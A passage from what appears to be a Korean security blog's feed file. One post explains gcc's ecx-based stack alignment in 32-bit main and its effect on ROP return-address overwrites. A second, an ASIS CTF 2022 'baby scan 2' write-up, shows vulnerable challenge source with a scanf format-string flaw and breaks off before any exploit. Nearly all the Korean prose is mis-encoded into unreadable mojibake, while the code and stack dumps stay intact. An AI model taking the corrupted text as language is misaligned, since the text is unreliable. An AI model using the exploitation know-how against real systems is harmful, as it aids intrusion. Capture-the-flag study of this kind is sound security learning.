ˆì§€ìŠ¤í„°ë¥¼-ì™œ-push-í–ˆì„ê¹Œ" class="headerlink" title="ecx ë ˆì§€ìŠ¤í„°ë¥¼ ì™œ push í–ˆì„ê¹Œ?"></a><em>ecx ë ˆì§€ìŠ¤í„°ë¥¼ ì™œ push í–ˆì„ê¹Œ?</em></h4><p>ecx is a temporary register so it has to be saved. Also, depending on optimization level, some of the frame linkage ops that donâ€™t seem strictly necessary to run the program might well be important in order to set up a trace-ready chain of frames.</p><ul><li>ì¶œì²˜: <a href="https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address">https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address</a></li></ul><h3 id="3-í”„ë¡¤ë¡œê·¸"><a href="#3-í”„ë¡¤ë¡œê·¸" class="headerlink" title="3. í”„ë¡¤ë¡œê·¸"></a>3. í”„ë¡¤ë¡œê·¸</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ebpë¥¼ pushí•˜ê³  mov ëª…ë ¹ìœ¼ë¡œ ebpë¥¼ espì™€ ê°™ê²Œ ì˜®ê²¨ì£¼ì—ˆë‹¤.</p><p>ì—í•„ë¡œê·¸ë¥¼ ì§„í–‰í•´ì„œ ebpì™€ espë¥¼ ì• ì¨ ë§žì¶°ì£¼ì—ˆìŒì—ë„ ë¶ˆêµ¬í•˜ê³ (?) ecxë¥¼ pushí–ˆë‹¤. 32bit í”„ë¡œê·¸ëž¨ì´ë¼ë©´ ë¬´ì¡°ê±´ buf, ebp(sfp) ìˆœì¼ ì¤„ ì•Œì•˜ëŠ”ë° ì¤‘ê°„ì— ecxê°€ ë¼ì–´ìžˆë‹¤. ì´ê²ƒì„ ë³´ì§€ ëª»í•˜ê³  ë¬´ìž‘ì • ìµìŠ¤ë¥¼ ì§„í–‰í•˜ë ¤ê³  í•˜ë‹¤ê°€ í‰ì†Œì™€ ìŠ¤íƒì´ ìŒ“ì´ëŠ” ê²ƒì´ ì´ìƒí•¨ì„ ê°ì§€í•˜ê³  ë¶„ì„ì„ ì§„í–‰í•˜ê²Œ ë˜ì—ˆë‹¤.</p><h3 id="4-memset-í•¨ìˆ˜-í˜¸ì¶œ"><a href="#4-memset-í•¨ìˆ˜-í˜¸ì¶œ" class="headerlink" title="4. memset í•¨ìˆ˜ í˜¸ì¶œ"></a>4. memset í•¨ìˆ˜ í˜¸ì¶œ</h3><p>ì—í•„ë¡œê·¸ ì§„í–‰ í›„ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ìŠ¤íƒì— ì¸ìžë“¤ì´ pushë˜ëŠ” ê²ƒì„ ì‚´íŽ´ë³´ìž.</p><p>ë¶„ì„í•  ì–´ì…ˆì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br><span class="line">   <span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line">   <span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line">â†’  <span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd900</span> â†’ <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ì‹¤í–‰í•˜ê³  ë‚œ í›„.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8f0â”‚+0x0000: 0xffffd900  â†’  0x00000000â† $esp</span><br><span class="line">0xffffd8f4â”‚+0x0004: 0x00000000</span><br><span class="line">0xffffd8f8â”‚+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd8fcâ”‚+0x000c: 0x00000000</span><br><span class="line">0xffffd900â”‚+0x0010: 0x00000000  //&lt;-- ì—¬ê¸°ì„œë¶€í„° 0x40 ë°”ì´íŠ¸ ì´ˆê¸°í™”</span><br><span class="line">0xffffd904â”‚+0x0014: 0x00000000</span><br><span class="line">0xffffd908â”‚+0x0018: 0x00000000</span><br><span class="line">0xffffd90câ”‚+0x001c: 0x00000000</span><br><span class="line">0xffffd910â”‚+0x0020: 0x00000000</span><br><span class="line">0xffffd914â”‚+0x0024: 0x00000000</span><br><span class="line"> </span><br><span class="line">0xffffd918â”‚+0x0028: 0x00000000</span><br><span class="line">0xffffd91câ”‚+0x002c: 0x00000000</span><br><span class="line">0xffffd920â”‚+0x0030: 0x00000000</span><br><span class="line">0xffffd924â”‚+0x0034: 0x00000000</span><br><span class="line">0xffffd928â”‚+0x0038: 0x00000000</span><br><span class="line">0xffffd92câ”‚+0x003c: 0x00000000</span><br><span class="line">0xffffd930â”‚+0x0040: 0x00000000</span><br><span class="line">0xffffd934â”‚+0x0044: 0x00000000</span><br><span class="line">0xffffd938â”‚+0x0048: 0x00000000</span><br><span class="line">0xffffd93câ”‚+0x004c: 0x00000000  //&lt;-- 0xffffd900 ~ 0xffffd93f ê¹Œì§€ 0x40 ë°”ì´íŠ¸ê°€ ì´ˆê¸°í™” ë¨</span><br><span class="line"> </span><br><span class="line">0xffffd940â”‚+0x0050: 0x00000000  </span><br><span class="line">0xffffd944â”‚+0x0054: 0xffffd960  â†’  0x00000001 //â† $ecx</span><br><span class="line">0xffffd948â”‚+0x0058: 0x00000000â† $ebp</span><br><span class="line">0xffffd94câ”‚+0x005c: 0xf7c1f119  â†’   add esp, 0x10</span><br><span class="line">0xffffd950â”‚+0x0060: 0x00000000</span><br><span class="line">0xffffd954â”‚+0x0064: 0x00000000</span><br><span class="line">0xffffd958â”‚+0x0068: 0x8048354  â†’  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95câ”‚+0x006c: 0xf7c1f119  â†’   add esp, 0x10</span><br><span class="line">0xffffd960â”‚+0x0070: 0x00000001</span><br><span class="line">0xffffd964â”‚+0x0074: 0xffffda14  â†’  0xffffdb90  â†’  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br></pre></td></tr></table></figure><p>ecxë¥¼ pushí–ˆê¸° ë•Œë¬¸ì— alignì´ ë§žì§€ ì•Šì•„ buf í¬ê¸°ëŠ” 0x40ì´ì§€ë§Œ espë¥¼ 0x44ë§Œí¼ ì˜¬ë ¤ì£¼ì—ˆë‹¤.(bufë¥¼ ìœ„í•´ ê³µê°„í™•ë³´) </p><p>ë˜í•œ ê³§ë°”ë¡œ espë¥¼ 0x4 ì˜¬ë ¤ì£¼ì—ˆëŠ”ë°, ì´ëŠ” memsetì˜ ì¸ìžë¥¼ êµ¬ì„±í•  ë•Œ alignì„ ë§žì¶°ì£¼ê¸° ìœ„í•´ì„œì´ë‹¤.</p><p>ì´ í›„ì— ì‹¤ì§ˆì ìœ¼ë¡œ memsetì—ì„œ ì‚¬ìš©í•˜ëŠ” ì„¸ ê°œì˜ ì¸ìžë¥¼ pushí–ˆë‹¤. </p><h3 id="5-ì—í•„ë¡œê·¸"><a href="#5-ì—í•„ë¡œê·¸" class="headerlink" title="5. ì—í•„ë¡œê·¸"></a>5. ì—í•„ë¡œê·¸</h3><p>ì—í•„ë¡œê·¸ì— ë‚¯ì„  ëª…ë ¹ì´ ì¶”ê°€ë˜ì–´ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret    </span><br></pre></td></tr></table></figure><p>ë¬´ìž‘ì • ìµìŠ¤ë¥¼ ì§„í–‰í•˜ë ¤ê³  í•  ë•Œ main+100ì—ì„œ í„°ì¡Œì—ˆë‹¤. ìŠ¤íƒ ìƒí™©ì´ ë¬´ì¡°ê±´ buf, ebp(sfp) ìˆœì„œìž„ì„ ê¸°ëŒ€í–ˆê¸° ë•Œë¬¸ì´ë‹¤.<br>ì‹¤ì œë¡  buf, ecx(ebp-0x4), ebp(sfp) ìˆœì´ë‹¤.</p><p>ebp ìœ„ì¹˜ë¼ê³  ìƒê°í•˜ê³  ë„£ì—ˆë˜ ê°’ì´ ì‹¤ì œë¡  ebp-0x4ì˜€ê¸° ë•Œë¬¸ì— í„°ì ¸ë²„ë ¸ë‹¤.</p><h1 id="For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary"><a href="#For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary" class="headerlink" title="(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary."></a>(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary.</h1><p>32bit í”„ë¡œê·¸ëž¨ì—ì„  block ë‹¨ìœ„ê°€ 4ë°”ì´íŠ¸ì´ë‹¤. ë”°ë¼ì„œ ìŠ¤íƒ êµ¬ì¡°ëŠ” í†µìƒì ìœ¼ë¡œ ì•Œê³  ìžˆëŠ” ê·¸ êµ¬ì¡°ê³ , í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ë„ ì•Œê³  ìžˆëŠ” ê·¸ ì–´ì…ˆì´ë‹¤. ìžì„¸ížˆ ì„¤ëª…í•˜ì§€ ì•Šê³  ì½”ë“œì™€ ìŠ¤íƒ êµ¬ì¡°ë§Œ ë³´ì—¬ì£¼ê³  ë„˜ì–´ê°€ê² ë‹¤.</p><p>ì°¸ê³ ë¡œ Pwnableì—ì„œì˜ 32bit í”„ë¡œê·¸ëž¨ì€ (ê±°ì˜) ëŒ€ë¶€ë¶„ <code>-mpreferred-stack-boundary=2</code> ì˜µì…˜ìœ¼ë¡œ ì»´íŒŒì¼ë˜ì—ˆë‹¤.</p><h3 id="disassemble-main-1"><a href="#disassemble-main-1" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491ee</span> &lt;+<span class="number">0</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491ef</span> &lt;+<span class="number">1</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">3</span>&gt;:sub    esp,<span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f4</span> &lt;+<span class="number">6</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f6</span> &lt;+<span class="number">8</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">10</span>&gt;:lea    eax,[ebp<span class="number">-0x40</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">13</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">14</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x0804923b</span> &lt;+<span class="number">77</span>&gt;:leave  </span><br><span class="line"><span class="number">0x0804923c</span> &lt;+<span class="number">78</span>&gt;:ret    </span><br></pre></td></tr></table></figure><h3 id="memset-í•¨ìˆ˜-í˜¸ì¶œ"><a href="#memset-í•¨ìˆ˜-í˜¸ì¶œ" class="headerlink" title="memset í•¨ìˆ˜ í˜¸ì¶œ"></a>memset í•¨ìˆ˜ í˜¸ì¶œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd908</span> â†’ <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8fcâ”‚+0x0000: 0xffffd908  â†’  0x00000000â† $esp</span><br><span class="line">0xffffd900â”‚+0x0004: 0x00000000</span><br><span class="line">0xffffd904â”‚+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd908â”‚+0x000c: 0x00000000  //&lt;-- ì—¬ê¸°ì„œë¶€í„° 0x40ë°”ì´íŠ¸ ì´ˆê¸°í™”</span><br><span class="line">0xffffd90câ”‚+0x0010: 0x00000000</span><br><span class="line">0xffffd910â”‚+0x0014: 0x00000000</span><br><span class="line">0xffffd914â”‚+0x0018: 0x00000000</span><br><span class="line">0xffffd918â”‚+0x001c: 0x00000000</span><br><span class="line">0xffffd91câ”‚+0x0020: 0x00000000</span><br><span class="line">0xffffd920â”‚+0x0024: 0x00000000</span><br><span class="line"></span><br><span class="line">0xffffd924â”‚+0x0028: 0x00000000</span><br><span class="line">0xffffd928â”‚+0x002c: 0x00000000</span><br><span class="line">0xffffd92câ”‚+0x0030: 0x00000000</span><br><span class="line">0xffffd930â”‚+0x0034: 0x00000000</span><br><span class="line">0xffffd934â”‚+0x0038: 0x00000000</span><br><span class="line">0xffffd938â”‚+0x003c: 0x00000000</span><br><span class="line">0xffffd93câ”‚+0x0040: 0x00000000</span><br><span class="line">0xffffd940â”‚+0x0044: 0x00000000</span><br><span class="line">0xffffd944â”‚+0x0048: 0x00000000  //&lt;-- 0xffffd908 ~ 0xffffd947 ê¹Œì§€ 0x40 ë°”ì´íŠ¸ê°€ ì´ˆê¸°í™” ë¨</span><br><span class="line">0xffffd948â”‚+0x004c: 0x00000000â† $ebp </span><br><span class="line"></span><br><span class="line">0xffffd94câ”‚+0x0050: 0xf7c1f119  â†’   add esp, 0x10</span><br><span class="line">0xffffd950â”‚+0x0054: 0x00000001</span><br><span class="line">0xffffd954â”‚+0x0058: 0xffffda04  â†’  0xffffdb8e  â†’  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd958â”‚+0x005c: 0xffffda0c  â†’  0xffffdbb0  â†’  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd95câ”‚+0x0060: 0xffffd970  â†’  0xf7e1fe34  â†’  0x0021fd4c</span><br><span class="line">0xffffd960â”‚+0x0064: 0xf7e1fe34  â†’  0x0021fd4c</span><br><span class="line">0xffffd964â”‚+0x0068: 0x80491ee  â†’  &lt;main+0&gt; push ebp</span><br><span class="line">0xffffd968â”‚+0x006c: 0x00000001</span><br><span class="line">0xffffd96câ”‚+0x0070: 0xffffda04  â†’  0xffffdb8e  â†’  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd970â”‚+0x0074: 0xf7e1fe34  â†’  0x0021fd4c</span><br></pre></td></tr></table></figure><h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><p>ì°¸ê³ ë¡œ 64bit í”„ë¡œê·¸ëž¨ì—ì„œëŠ” block ë‹¨ìœ„ê°€ 4ë°”ì´íŠ¸ì—ì„œ 8ë°”ì´íŠ¸ë¡œ ëŠ˜ì–´ë‚¬ê¸° ë•Œë¬¸ì— <code>-mpreferred-stack-boundary=2</code> ì˜µì…˜ì„ ì‚¬ìš©í•˜ë ¤ê³  í•˜ë©´ ì—ëŸ¬ë¥¼ ë‚´ë¿œëŠ”ë‹¤.</p><h3 id="ê¶ê¸ˆì¦"><a href="#ê¶ê¸ˆì¦" class="headerlink" title="ê¶ê¸ˆì¦"></a>ê¶ê¸ˆì¦</h3><p>ë¬´ë ¤ 6ë…„ 9ê°œì›” ì „ ì–´ë–¤ ë¶„ì´ í•˜ì‹  ê¶ê¸ˆì¦ê³¼ ë™ì¼í•œ ê¶ê¸ˆì¦ì„ ê°€ì¡Œë‹¤. ì•ˆíƒ€ê¹ê²Œë„ í•´ë‹¹ ì§ˆë¬¸ì— ëŒ€í•œ ë‹µì€ ì°¾ì•„ë³´ê¸° ì–´ë ¤ì› ë‹¤. </p><p>I noticed that when not using -mpreferred-stack-boundary&#x3D;2, gcc might compile â€œmainâ€ with an interesting prologue&#x2F;epilogue: effectively â€œrelying on $ecx (which relies on $ebp-4) for $esp value before retâ€. Has anyone else come across this observation?</p><p>This means you can not overwrite normal ret address staying at $ebp+4, but instead you have to overwrite $ebp-4 (that is ecx) and reposition the stack pointer and your return address (effectively using a stack pivot) to further the exploitation.</p><ul><li><a href="https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2">https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> stack alignment </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 2 (fsb, scanf)</title>
      <link href="/221018-asisctf2022-babysacn_2/"/>
      <url>/221018-asisctf2022-babysacn_2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(41&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ bin</span><br><span class="line">â”‚Â Â  â””â”€â”€ chall</span><br><span class="line">â”œâ”€â”€ lib</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ld-2.31.so</span><br><span class="line">â”‚Â Â  â””â”€â”€ libc.so.6</span><br><span class="line">â”œâ”€â”€ run.sh</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ main.c</span><br></pre></td></tr></table></figure><h3 id="making-patched-chall"><a href="#making-patched-chall" class="headerlink" title="making patched chall"></a>making patched chall</h3><p>libcì™€ ldê°€ ì£¼ì–´ì¡Œìœ¼ë‹ˆ remote í™˜ê²½ê³¼ ë™ì¼í•˜ê²Œ challì„ êµ¬ì„±í•˜ê¸° ìœ„í•´ patchë¥¼ ì§„í–‰í–ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch bin]$ ldd pchall </span><br><span class="line">linux-vdso.so.1 (0x00007ffc2bd90000)</span><br><span class="line">./../lib/libc.so.6 (0x00007f46adf9f000)</span><br><span class="line">./../lib/ld-2.31.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f46ae193000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>); <span class="comment">// difference of babyscan_1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>baby scan 1</code> ë¬¸ì œì™€ ë‹¤ë¥¸ ì ì€ ë”± í•˜ë‚˜ë‹¤. <code>size+1</code> í¬ê¸°ë¥¼ ìŠ¤íƒì´ ì•„ë‹Œ íž™ì— í• ë‹¹í•œë‹¤. ë”°ë¼ì„œ <code>baby scan 1</code> ì²˜ëŸ¼ í’€ì´ë¥¼ ì§„í–‰í•œë‹¤ë©´ íž™ ì˜¤ë²„í”Œë¡œìš°ê°€ ë‚˜íƒ€ë‚˜ê²Œ ëœë‹¤. í•˜ì§€ë§Œ ì´ ì·¨ì•½ì ë§Œìœ¼ë¡  ìµìŠ¤ê°€ ë¶ˆê°€ëŠ¥í•˜ë‹¤. freeë„ ì—†ê³  ë‹¨ìˆœížˆ íž™ í• ë‹¹ í•œ ë²ˆ ê°€ì§€ê³ ëŠ” í•  ìˆ˜ ìžˆëŠ” ê²Œ ì—†ë‹¤. íž™ ì˜¤ë²„ë¥¼ ì´ìš©í•´ì„œ ë‹¤ìŒ chunckì˜ sizeë¥¼ ì¡°ì ˆê°€ëŠ¥í•˜ì§€ë§Œ ì“¸ëª¨ì—†ë‹¤. ê·¸ëž˜ì„œ ë‹¤ë¥¸ ì·¨ì•½ì ì„ ì°¾ì•„ì•¼ í•œë‹¤. ì´ ê³¼ì •ì—ì„œ ì‹œê°„ì„ ë§Žì´ í—ˆë¹„í•´ì„œ ëŒ€íšŒ ì‹œê°„ ë‚´ì— í’€ì§€ ëª»í•˜ì˜€ë‹¤.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>ë™ìž‘ ê³¼ì •ì„ ì‚´íŽ´ë³´ë©´ì„œ ì·¨ì•½ì ì„ ì°¾ì•„ë³´ìž.</p><ol><li><p>sizeì— 15ê¸€ìžë¥¼ ë°›ëŠ”ë‹¤. (16ê¸€ìžê°€ ì•„ë‹ˆë¼ 15ê¸€ìžë‹¤.. ì´ê²ƒ ë•Œë¬¸ì— ìµìŠ¤ì½”ë“œ ìž‘ì„±í•  ë•Œ ì´ˆë°˜ì— ì‚½ì§ˆí–ˆë‹¤.) <em>&lt;â€“<code>scanf</code>ì˜ í¬ë§·ìŠ¤íŠ¸ë§ì„ ì—¬ê¸°ì„œ ìž…ë ¥í•´ì•¼ í•œë‹¤.</em></p></li><li><p>size+1 ë§Œí¼ íž™ í• ë‹¹ì„ ì§„í–‰í•œë‹¤. <em>&lt;â€“ì‚¬ì‹¤ìƒ ì‹ ê²½ì•ˆì¨ë„ ëœë‹¤.</em></p></li><li><p><code>snprintf</code>ë¥¼ ì´ìš©í•˜ì—¬ íž™ ìž…ë ¥ì— ì‚¬ìš©ë  <code>scanf</code>ì˜ í¬ë§·ìŠ¤íŠ¸ë§ì„ 